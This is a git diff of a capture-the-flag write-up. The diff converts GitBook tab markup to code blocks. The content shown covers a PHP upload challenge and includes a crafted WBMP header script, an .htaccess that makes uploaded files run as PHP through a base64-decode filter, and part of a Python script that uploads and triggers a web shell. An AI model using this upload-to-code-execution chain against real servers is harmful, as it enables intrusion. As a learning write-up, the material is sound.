@@ -12,8 +12,7 @@ So it was 1 AM when i joined the contest, i was intend to play about ~ 2 hours t
 
 ## Bypass checkpoints
 
-{% tabs %}
-{% tab title="checkpoints.php" %}
+{% code title="checkpoints.php" %}
 ```php
 <?php
 if (isset($_GET["source"])) 
@@ -98,8 +97,7 @@ echo "</ul>";
 </form>
 <!-- /?source -->
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ### Checkpoint 1 : Name
 
@@ -200,44 +198,37 @@ static int php_get_wbmp(php_stream *stream, struct gfxinfo **result, int check)
 }
 ```
 
-{% tabs %}
-{% tab title="Source" %}
+{% code title="Source" %}
 ```text
 https://github.com/php/php-src/blob/e219ec144ef6682b71e135fd18654ee1bb4676b4/ext/standard/image.c
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 With a little bit math calculation, we can get it done
 
-![](.gitbook/assets/image%20%28217%29.png)
+![](.gitbook/assets/image%20%28218%29.png)
 
-{% tabs %}
-{% tab title="poc.py" %}
+{% code title="poc.py" %}
 ```text
 out = chr(0x00) + chr(0x00) + chr(0x8a) + chr(0x39) + chr(0x80) + chr(0x8a) + chr(0x39) + chr(0x00)
 print out
 out += '''your htaccess'''
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ### Checkpoint 5 : PHP
 
 It was checking if "&lt;?" is in the uploaded file, so we need encode the shell in base64
 
-{% tabs %}
-{% tab title=".htaccess" %}
+{% code title=".htaccess" %}
 ```text
 AddType application/x-httpd-php .corb3nik php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.corb3nik"Upload shell
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 &lt;3 Credits go all to Corb3nik
 
-{% tabs %}
-{% tab title="up\_shell.py" %}
+{% code title="up\_shell.py" %}
 ```python
 #!/usr/bin/env python3
 
@@ -274,8 +265,7 @@ upload_content("trigger.corb3nik", VALID_WBMP)
 response = requests.get(URL + "/images/" + RANDOM_DIRECTORY + "/trigger.corb3nik")
 print(response.text)
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ## It's not done yet
 
